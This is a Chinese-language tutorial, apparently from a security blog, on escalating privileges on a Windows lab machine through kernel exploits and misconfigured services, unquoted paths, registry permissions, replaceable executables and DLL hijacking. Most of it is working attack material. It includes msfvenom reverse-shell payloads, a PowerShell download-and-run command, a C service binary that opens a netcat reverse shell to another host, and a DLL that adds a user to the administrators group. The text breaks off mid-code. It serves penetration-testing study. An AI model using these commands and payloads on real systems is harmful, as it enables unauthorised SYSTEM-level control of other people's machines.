<h2 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h2><p>Windows虚拟机:<a href="https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/">https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/</a></p>
<table>
<thead>
<tr>
<th>Windows ip</th>
<th>Kali ip</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.110.9</td>
<td>192.168.110.3</td>
</tr>
</tbody></table>
<p>测试的环境下，我们会预先获得一个windows user shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;shell_reverse_tcp LHOST&#x3D;192.168.110.3 LPORT&#x3D;53 -f exe -o reverse.exe</span><br></pre></td></tr></table></figure>

<p>或者某些提权，会使用RDP在GUI下进行提权</p>
<p>补充:某些情况下，reverse_shell不一定能稳定连接，我们可以进行migrate这样的方式，或者在高权限下执行系统命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;exec CMD&#x3D;&#39;net user administrator password123!&#39; -f exe -o test.exe</span><br></pre></td></tr></table></figure>

<h2 id="工具选择"><a href="#工具选择" class="headerlink" title="工具选择"></a>工具选择</h2><p>提权中，主要是基于当前环境的枚举，所以我们会使用一些自动化枚举工具，减少时间<br>比如综合的工具:winpeas,seatbelt,powerup,sharpup<br>其中主要会使用winpeas，因为winpeas带有颜色的重点标注非常友好</p>
<p>另外，还会使用AccessChk，这是一个古老但仍然使用的工具，它可以检查用户或组对文件，目录，服务和注册表的访问权限<br>这里不会使用最新版本，最新版会出现一个GUI弹窗。我们将使用老版，执行时会带有参数/accepteula去同意EULA</p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="Kernel-Exploits"><a href="#Kernel-Exploits" class="headerlink" title="Kernel Exploits"></a>Kernel Exploits</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>内核是任何操作系统的核心，可以把它想象成介于软件应用与电脑硬件的中间层，它具有对于操作系统的完全控制权，因此如果利用内核漏洞进行攻击，最后可以获得SYSTEM权限</p>
<h3 id="发现与利用"><a href="#发现与利用" class="headerlink" title="发现与利用"></a>发现与利用</h3><p>通常我们会通过一个程序来发现和利用内核漏洞，整个流程如下</p>
<ol>
<li>通过如<code>systeminfo</code>这样的命令来枚举windows的具体版本以及补丁安装情况</li>
<li>针对这些信息寻找漏洞利用程序(ExploitDB,Google,Github)</li>
<li>编译并执行</li>
</ol>
<p>但需注意，内核提权通常不是稳定的，它可能会直接造成系统的崩溃，所以根据经验，这应该是提权的最后手段</p>
<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p>metasploit</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use multi&#x2F;recon&#x2F;local_exploit_suggester</span><br><span class="line">use windows&#x2F;gather&#x2F;enum_patches</span><br></pre></td></tr></table></figure>

<p>sherlock</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell iex(new-object net.webclient).downloadString(&#39;http:&#x2F;&#x2F;192.168.110.3&#x2F;winpriv&#x2F;Sherlock.ps1&#39;);Find-AllVulns</span><br></pre></td></tr></table></figure>

<p>Windows-Exploit-Suggester(需要将systeminfo复制到一个文件里)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python windows-exploit-suggester.py --update</span><br><span class="line">python windows-exploit-suggester.py -d 2020-09-11-mssb.xls -i test.txt</span><br></pre></td></tr></table></figure>

<p>wes.py</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python wes.py systeminfo.txt -i &#39;Elevation of Privilege&#39; --exploits-only | less</span><br></pre></td></tr></table></figure>

<p>watson(依赖.Net,所以要先枚举对方的.Net版本:C:\windows\microsoft.net\framework)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\watson</span><br></pre></td></tr></table></figure>

<p>accesschk<br>简单来说</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">quv	这三个选项都是优化查询的</span><br><span class="line">w  	可写</span><br><span class="line">c 	服务</span><br><span class="line">k   注册表</span><br><span class="line">d 	目录</span><br></pre></td></tr></table></figure>

<h2 id="Services-Exploits"><a href="#Services-Exploits" class="headerlink" title="Services Exploits"></a>Services Exploits</h2><p>服务是运行在后台的常规任务，它可以接受用户输入。如果服务以系统权限运行并且配置错误，它会导致能够SYSTEM权限执行任意命令</p>
<p>这里容易出现shell不稳定的情况，因为当一个进程在windows操作系统种启动后，必须与服务控制管理器进行通信，如果没有进行通信，服务管理控制器会认为出现了错误，进而终止这个程序，所以需要程序迁移(migrate)</p>
<h3 id="手动枚举服务"><a href="#手动枚举服务" class="headerlink" title="手动枚举服务"></a>手动枚举服务</h3><p>获取服务名称</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic service get displayname,name,pathname</span><br></pre></td></tr></table></figure>

<p>查询服务配置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc.exe qc &lt;name&gt;</span><br></pre></td></tr></table></figure>

<p>查询服务当前状态</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc.exe query &lt;name&gt;</span><br></pre></td></tr></table></figure>

<p>修改服务配置(注意这里=必须紧跟option)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc.exe config &lt;name&gt; &lt;option&gt;&#x3D; &lt;value&gt;</span><br></pre></td></tr></table></figure>

<p>启动/停止服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net start&#x2F;stop &lt;name&gt;</span><br></pre></td></tr></table></figure>

<p>*补充2个通过注册表枚举的技巧，可以用来bypass(如AppLocker)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Set-Location &#39;HKLM:\SYSTEM\CurrentControlSet\Services\&#39;</span><br><span class="line">Get-ChildItem</span><br><span class="line">注意Displayname字段</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd &#x2F;c REG QUERY HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall</span><br></pre></td></tr></table></figure>

<h3 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a>提权</h3><p>利用服务提权的方式有很多，常见的有5种</p>
<ol>
<li>Insecure Service Properties</li>
<li>Unquoted Service Path</li>
<li>Weak Registry Permissions</li>
<li>Insecure Service Executables</li>
<li>DLL Hijacking</li>
</ol>
<h4 id="Insecure-Service-Properties"><a href="#Insecure-Service-Properties" class="headerlink" title="Insecure Service Properties"></a>Insecure Service Properties</h4><p>每个服务都会通过ACL来规定用户对它的权限<br>有些是无害的，比如(SERVICE_QUERY_CONFIG，SERVICE_QUERY_STATUS)<br>有些可能有用，比如(SERVICE_STOP，SERVICE_START)<br>有些是危险的，比如(SERVICE_CHANGE_CONFIG,SERVICE_CHANGE_CONFIG)</p>
<p>如果我们有权限可以修改运行在SYSTEM权限下服务的配置信息，就去修改其执行的二进制文件的路径<br><strong>注意</strong>：如果你可以修改一个服务的配置，但是不能启动或停止该服务，你可能不能利用它来进行提权，对于自动启动的服务，我们应该去检查SeShutdownPrivilege，如果可以重启，也能可以得到权限提升</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shutdown &#x2F;r &#x2F;t 0</span><br></pre></td></tr></table></figure>

<p>演示</p>
<ol>
<li>winpeas枚举</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\winpeas.exe quiet servicesinfo</span><br></pre></td></tr></table></figure>

<p>另外accesschk.exe也可以枚举</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\accesschk.exe &#x2F;accepteula -uwcqv user *</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>关注有漏洞的服务</li>
</ol>
<p><img src="/images/windows-privilege-escalation/1.png" alt="1"></p>
<p><img src="/images/windows-privilege-escalation/2.png" alt="2"></p>
<ol start="3">
<li>accesschk进一步检查权限</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\accesschk.exe &#x2F;accepteula -uwcqv user daclsvc</span><br></pre></td></tr></table></figure>



<p><img src="/images/windows-privilege-escalation/3.png" alt="3"></p>
<p>发现有我们提权所需的权限</p>
<ol start="4">
<li>确认服务的配置信息</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc qc daclsvc</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/4.png" alt="4"></p>
<p>从中重点关注</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">START_TYPE         : 3   DEMAND_START											&#x2F;&#x2F;可以手动启动</span><br><span class="line">BINARY_PATH_NAME   : &quot;C:\Program Files\DACL Service\daclservice.exe&quot;			&#x2F;&#x2F;文件执行路径</span><br><span class="line">DEPENDENCIES       : 															&#x2F;&#x2F;程序执行没有依赖</span><br><span class="line">SERVICE_START_NAME : LocalSystem												&#x2F;&#x2F;服务确实以SYSTEM来运行</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>检查当前运行状态</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc query daclsvc</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/5.png" alt="5"></p>
<p>这里为STOPPED，表示我们修改完准备利用的配置后，直接启动服务即可</p>
<ol start="6">
<li>重新设置</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc config daclsvc binpath&#x3D; &quot;\&quot;C:\PrivEsc\reverse.exe\&quot;&quot;</span><br></pre></td></tr></table></figure>

<p>最简单的提权方式，就是修改binpath为我们准备好的reverse_shell</p>
<p>或者你之前没有上传shell文件，可以直接执行powershell命令来反弹(powershell的base64编码可以避免一些单双引号的问题)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc config daclsvc binpath&#x3D; &quot;cmd &#x2F;c powershell -EncodedCommand aQBlAHgAKAAgAEkAVwBSAC....&quot;</span><br></pre></td></tr></table></figure>

<ol start="7">
<li>设置好监听后，启动该服务</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net start daclsvc</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/6.png" alt="6"></p>
<h4 id="Unquoted-Service-Path"><a href="#Unquoted-Service-Path" class="headerlink" title="Unquoted Service Path"></a>Unquoted Service Path</h4><p>windows的可执行程序可以在不需要扩展名的情况下运行(如whoami.exe只需要whoami即可运行)<br>一些可执行文件会接受参数，用空格符分隔，如program.exe agr1 agr2….<br>当使用不带引号且包含空格绝对路径时，这会导致歧义</p>
<p>比如这样的路径<code>C:\Program Files\Some Dir\SomeProgram.exe</code>，正常来看，它执行的是SomeProgram.exe<br>但对于windows来说，<code>C:\Program</code>可以是一个可执行程序，它携带两个参数<code>Files\Some</code>和<code>Dir\ SomeProgram.exe</code><br>windows会依次检查这种潜在可能性来进行排除。如果我们可以写入一个可执行文件在windows检查原本可执行文件之前，可以诱使服务去执行它们</p>
<p>演示</p>
<ol>
<li>winpeas枚举</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\winpeas.exe quiet servicesinfo</span><br></pre></td></tr></table></figure>

<p>在<code>Interesting Services -non Microsoft</code>条目里发现<code>No quotes and Space detected</code></p>
<p><img src="/images/windows-privilege-escalation/7.png" alt="7"></p>
<p>手动枚举</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic service get name,displayname,pathname,startmode | findstr &#x2F;i &#x2F;V &quot;C:\Windows&quot; |findstr &#x2F;i &#x2F;v &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">powershell</span><br><span class="line">Get-WmiObject win32_service | select Name,PathName,StartMode,StartName | where &#123;$_.StartMode -ne &quot;Disabled&quot; -and $_.StartName -eq &quot;LocalSystem&quot; -and $_.PathName -notmatch &quot;&#96;&quot;&quot; -and $_.PathName -notmatch &quot;C:\\Windows&quot;&#125; | Format-List</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>检查服务的配置</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc qc unquotedsvc</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/8.png" alt="8"></p>
<p>从路径，我们得到利用路径</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe</span><br><span class="line"></span><br><span class="line">可利用</span><br><span class="line">C:\Program.exe</span><br><span class="line">C:\Program Files\Unquoted.exe</span><br><span class="line">C:\Program Files\Unquoted Path Service\Common.exe</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>检查一下服务的权限，重点看我们是否有启动/停止权限</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\accesschk.exe &#x2F;accepteula -ucqv user unquotedsvc</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/9.png" alt="9"></p>
<ol start="4">
<li>依次检查可利用路径是否可以写入文件</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\accesschk.exe &#x2F;accepteula -uwdq C:\</span><br><span class="line">.\accesschk.exe &#x2F;accepteula -uwdq &quot;C:\Program Files\&quot;</span><br><span class="line">.\accesschk.exe &#x2F;accepteula -uwdq &quot;C:\Program Files\Unquoted Path Service\&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/10.png" alt="10"></p>
<p>看来在路径<code>C:\Program Files\Unquoted Path Service\</code>下<code>RW BUILTIN\Users</code>组的用户拥有W权限，这也是我们用户所在的组</p>
<ol start="5">
<li>复制我们提前准备好的reverse_shell的exe文件到利用目录，并改名</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy C:\PrivEsc\reverse.exe &quot;C:\Program Files\Unquoted Path Service\Common.exe&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/11.png" alt="11"></p>
<ol start="6">
<li>开启端口监听，并启动服务</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net start unquotedsvc</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/12.png" alt="12"></p>
<p>metasploit模块</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exploit&#x2F;windows&#x2F;local&#x2F;unquoted_service_path</span><br></pre></td></tr></table></figure>

<h4 id="Weak-Registry-Permissions"><a href="#Weak-Registry-Permissions" class="headerlink" title="Weak Registry Permissions"></a>Weak Registry Permissions</h4><p>windows的注册表存储每个服务的条目。注册表项也会使用ACL管理权限，如果ACL配置错误，即使不能直接修改服务，也可以修改服务的配置</p>
<ol>
<li>winpeas枚举</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\winpeas.exe quiet servicesinfo</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/13.png" alt="13"></p>
<p>发现了当前用户可以修改服务regsvc的注册表条目</p>
<p>手动枚举</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">accesschk.exe -kvusw hklm\System\CurrentControlSet\services</span><br><span class="line">(寻找:</span><br><span class="line">  RW NT AUTHORITY\INTERACTIVE</span><br><span class="line">        KEY_ALL_ACCESS</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">powershell</span><br><span class="line">Get-Acl -Path hklm:\System\CurrentControlset\services\* | select Path,AccessToString |Format-List</span><br><span class="line">(寻找:NT AUTHORITY\INTERACTIVE Allow  FullControl)</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>使用powershell或accesschk进一步检查我们对注册表的权限</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\PrivEsc&gt;powershell -exec bypass</span><br><span class="line">PS C:\PrivEsc&gt; Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc |Format-List</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/14.png" alt="14"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\accesschk.exe &#x2F;accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/15.png" alt="15"></p>
<p>注意<code>NT AUTHORITY\INTERACTIVE</code>组具有RW权限，这个组的成员包含所有能够登录到系统的成员，其中就有我们当前的用户</p>
<ol start="3">
<li>检查我们是否能够启动/停止服务</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\accesschk.exe &#x2F;accepteula -ucqv user regsvc</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/16.png" alt="16"></p>
<ol start="4">
<li>检查当前注册表的值</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg query HKLM\SYSTEM\CurrentControlSet\services\regsvc</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/17.png" alt="17"></p>
<p>从中我们知道了可执行程序的绝对路径和该服务以SYSTEM运行</p>
<ol start="5">
<li>接下来就和修改服务启动路径的方法一致，替换为我们的reverse_shell，不同点使这次我们通过修改注册表的值来完成</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc &#x2F;v ImagePath &#x2F;t REG_EXPAND_SZ &#x2F;d C:\PrivEsc\reverse.exe &#x2F;f</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/18.png" alt="18"></p>
<p>除了反弹shell.exe，也可以编译生成自己想要的命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;x86_64-w64-mingw32-gcc windows_service.c -o evil.exe</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">#define SLEEP_TIME 5000</span><br><span class="line"></span><br><span class="line">SERVICE_STATUS ServiceStatus; </span><br><span class="line">SERVICE_STATUS_HANDLE hStatus; </span><br><span class="line"> </span><br><span class="line">void ServiceMain(int argc, char** argv); </span><br><span class="line">void ControlHandler(DWORD request); </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;add the payload here</span><br><span class="line">int Run() </span><br><span class="line">&#123; </span><br><span class="line">    system(&quot;C:\\Users\\user\\Desktop\\nc.exe 192.168.110.2 5555 -e cmd&quot;);</span><br><span class="line">    return 0; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">int main() </span><br><span class="line">&#123; </span><br><span class="line">    SERVICE_TABLE_ENTRY ServiceTable[2];</span><br><span class="line">    ServiceTable[0].lpServiceName &#x3D; &quot;MyService&quot;;</span><br><span class="line">    ServiceTable[0].lpServiceProc &#x3D; (LPSERVICE_MAIN_FUNCTION)ServiceMain;</span><br><span class="line"></span><br><span class="line">    ServiceTable[1].lpServiceName &#x3D; NULL;</span><br><span class="line">    ServiceTable[1].lpServiceProc &#x3D; NULL;</span><br><span class="line"> </span><br><span class="line">    StartServiceCtrlDispatcher(ServiceTable);  </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void ServiceMain(int argc, char** argv) </span><br><span class="line">&#123; </span><br><span class="line">    ServiceStatus.dwServiceType        &#x3D; SERVICE_WIN32; </span><br><span class="line">    ServiceStatus.dwCurrentState       &#x3D; SERVICE_START_PENDING; </span><br><span class="line">    ServiceStatus.dwControlsAccepted   &#x3D; SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;</span><br><span class="line">    ServiceStatus.dwWin32ExitCode      &#x3D; 0; </span><br><span class="line">    ServiceStatus.dwServiceSpecificExitCode &#x3D; 0; </span><br><span class="line">    ServiceStatus.dwCheckPoint         &#x3D; 0; </span><br><span class="line">    ServiceStatus.dwWaitHint           &#x3D; 0; </span><br><span class="line"> </span><br><span class="line">    hStatus &#x3D; RegisterServiceCtrlHandler(&quot;MyService&quot;, (LPHANDLER_FUNCTION)ControlHandler); </span><br><span class="line">    Run(); </span><br><span class="line">    </span><br><span class="line">    ServiceStatus.dwCurrentState &#x3D; SERVICE_RUNNING; </span><br><span class="line">    SetServiceStatus (hStatus, &amp;ServiceStatus);</span><br><span class="line"> </span><br><span class="line">    while (ServiceStatus.dwCurrentState &#x3D;&#x3D; SERVICE_RUNNING)</span><br><span class="line">    &#123;</span><br><span class="line">		Sleep(SLEEP_TIME);</span><br><span class="line">    &#125;</span><br><span class="line">    return; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void ControlHandler(DWORD request) </span><br><span class="line">&#123; </span><br><span class="line">    switch(request) </span><br><span class="line">    &#123; </span><br><span class="line">        case SERVICE_CONTROL_STOP: </span><br><span class="line">			ServiceStatus.dwWin32ExitCode &#x3D; 0; </span><br><span class="line">            ServiceStatus.dwCurrentState  &#x3D; SERVICE_STOPPED; </span><br><span class="line">            SetServiceStatus (hStatus, &amp;ServiceStatus);</span><br><span class="line">            return; </span><br><span class="line"> </span><br><span class="line">        case SERVICE_CONTROL_SHUTDOWN: </span><br><span class="line">            ServiceStatus.dwWin32ExitCode &#x3D; 0; </span><br><span class="line">            ServiceStatus.dwCurrentState  &#x3D; SERVICE_STOPPED; </span><br><span class="line">            SetServiceStatus (hStatus, &amp;ServiceStatus);</span><br><span class="line">            return; </span><br><span class="line">        </span><br><span class="line">        default:</span><br><span class="line">            break;</span><br><span class="line">    &#125; </span><br><span class="line">    SetServiceStatus (hStatus,  &amp;ServiceStatus);</span><br><span class="line">    return; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<ol start="6">
<li>开启监听，启动服务</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net start regsvc</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/19.png" alt="19"></p>
<h4 id="Insecure-Service-Executables"><a href="#Insecure-Service-Executables" class="headerlink" title="Insecure Service Executables"></a>Insecure Service Executables</h4><p>如果用户可直接修改原始服务的可执行文件，我们可以直接用我们的reverse_shell来代替<br>这种操作具有危险性，正式渗透中应该先备份服务文件</p>
<p>演示</p>
<ol>
<li>winpeas枚举</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\winpeas.exe quiet servicesinfo</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/20.png" alt="20"></p>
<p>在<code>Interesting Services -non Microsoft</code>条目下发现<code>File Permissions: Everyone [AllAccess]</code></p>
<p>手动枚举只能枚举服务的二进制程序路径，然后检查该文件的权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic service get displayname,name,pathname</span><br><span class="line">.\accesschk.exe &#x2F;accepteula -quvw &quot;FILE_PATH&quot;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>accesschk检查文件权限</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\accesschk.exe &#x2F;accepteula -quvw &quot;C:\Program Files\File Permissions Service\filepermservice.exe&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/21.png" alt="21"></p>
<ol start="3">
<li>检查我们是否能够启动/停止服务</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\accesschk.exe &#x2F;accepteula -uvqc filepermsvc</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/22.png" alt="22"></p>
<ol start="4">
<li>安全备份原始文件，并将reverse_shell的exe文件对其进行替换</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy &quot;C:\Program Files\File Permissions Service\filepermservice.exe&quot; C:\Temp</span><br><span class="line">copy &#x2F;Y C:\PrivEsc\reverse.exe &quot;C:\Program Files\File Permissions Service\filepermservice.exe&quot;</span><br></pre></td></tr></table></figure>

<p>除了反弹shell，windows_service.c也可以使用</p>
<p>开启监听，启动服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net start filepermsvc</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/23.png" alt="23"></p>
<p>metasploit模块</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exploit&#x2F;windows&#x2F;local&#x2F;service_permissions</span><br></pre></td></tr></table></figure>

<h4 id="DLL-Hijacking"><a href="#DLL-Hijacking" class="headerlink" title="DLL Hijacking"></a>DLL Hijacking</h4><p>通常服务会从DLL库中加载功能。无论DLL提供什么样的功能，都将与加载它的服务以相同的权限执行。<br>如果一个DLL使用绝对路径加载的，而且我们可以对他进行写入，那么可能可以用来进行提权</p>
<p>(补充:一种更常见的利用DLL劫持的错误配置使，系统中缺少了某个DLL库，当前用户Windows搜索DLL的PATH内的目录拥有写入权限。但这种漏洞很难被发现，而且整个发现和利用过程都需要手动进行)</p>
<p>演示</p>
<ol>
<li>winpeas枚举</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\winpeas.exe quiet servicesinfo</span><br></pre></td></tr></table></figure>

<p>在Interesting Services -non Microsoft条目下发现一些服务，并在PATH中发现了我们可以拥有写权限的目录<code>C:\Temp</code>，这可能会导致DLL劫持</p>
<p><img src="/images/windows-privilege-escalation/24.png" alt="24"></p>
<p><strong>附录:</strong></p>
<p>真实情况中，在受害者的机器上寻找系统环境变量</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo %PATH%</span><br></pre></td></tr></table></figure>

<p>如果这里的目录可写，回到自己搭建的环境下也要创建相同的目录</p>
<p>接着在受害者的机器上寻找当前低权限用户能够启动的服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\accesschk.exe &#x2F;accepteula -ucqv user *</span><br></pre></td></tr></table></figure>

<p>之后去寻找它们的二进制程序，接着复制它们到自己控制的机器上，创建服务</p>
<p>顺带一提如何配置引号路径，下面这种直接添加引号的方式是不行的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc create dllsvc binPath&#x3D; &quot;C:\Users\Administrator\Desktop\dll hijack test\dllhijackservice.exe&quot; type&#x3D; own</span><br></pre></td></tr></table></figure>

<p>正确的写法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc create dllsvc binPath&#x3D; &quot;\&quot;C:\Users\Administrator\Desktop\dll hijack test\dllhijackservice.exe&quot;&quot; type&#x3D; own</span><br></pre></td></tr></table></figure>

<p>测试完要删除的命令为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc delete dllsvc</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>检查我们是否能够启动/停止服务</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\accesschk.exe &#x2F;accepteula -uvqc dllsvc</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/25.png" alt="25"></p>
<ol start="3">
<li>查看服务配置</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc qc dllsvc</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/26.png" alt="26"></p>
<p>找到了文件的执行路径，并且该服务以SYSTEM权限运行</p>
<ol start="4">
<li>分析该文件</li>
</ol>
<p>正常情况下，拷贝这个可执行文件到另一台我们拥有Admin权限的机器上进行分析。<br>这里为了演示，我们直接在这台机器上以Admin身份进行分析</p>
<p>直接以Administrator身份运行Procmon<br>关闭抓取，并清空记录</p>
<p><img src="/images/windows-privilege-escalation/27.png" alt="27"></p>
<p>Ctrl+L进入过滤规则设置，添加规则，输入我们刚刚找到程序的名字</p>
<p><img src="/images/windows-privilege-escalation/28.png" alt="28"></p>
<p>关闭注册表检测和网络检测，并开启抓取</p>
<p><img src="/images/windows-privilege-escalation/29.png" alt="29"></p>
<p>之后开启服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net start dllsvc</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/30.png" alt="30"></p>
<p>关注到<code>NAME NOT FOUND</code>列，这是Windows尝试在目录中寻找的DLL库文件<br>其中<code>C:\Temp\</code>目录是我们之前找到我们可以写入的目录，并且程序在寻找<code>hijackme.dll</code></p>
<p>5.在kali中生成reverse_shell的dll文件，并传输到目标机器上</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;shell_reverse_tcp LHOST&#x3D;192.168.110.3 LPORT&#x3D;53 -f dll -o hijackme.dll</span><br></pre></td></tr></table></figure>

<p>除了反弹shell，也可以编译自己任意命令的dll</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll</span></span><br><span class="line"><span class="comment">// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">DllMain</span><span class="params">(HANDLE hDll, DWORD dwReason, LPVOID lpReserved)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (dwReason == DLL_PROCESS_ATTACH) &#123;</span><br><span class="line">        system(<span class="string">&quot;cmd.exe /k net localgroup administrator user /add&quot;</span>);</span><br><span class="line">        <span class="comment">//system(&quot;cmd.exe /k whoami &gt; C:\\Windows\\Temp\\dll.txt&quot;);</span></span><br><span class="line">        ExitProcess(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span 